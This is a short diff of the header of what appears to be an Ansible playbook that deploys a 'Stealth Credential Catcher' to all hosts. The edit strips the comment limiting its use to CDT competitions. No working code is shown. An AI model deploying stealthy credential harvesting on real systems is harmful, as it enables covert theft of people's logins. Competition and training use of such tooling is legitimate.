@@ -1,6 +1,6 @@
 ---
 #Tyler Gardner
-# Purpose: Stealth credential catcher for CDT competitions
+# Purpose: Stealth credential catcher 
 
 - name: Deploy Stealth Credential Catcher
   hosts: all
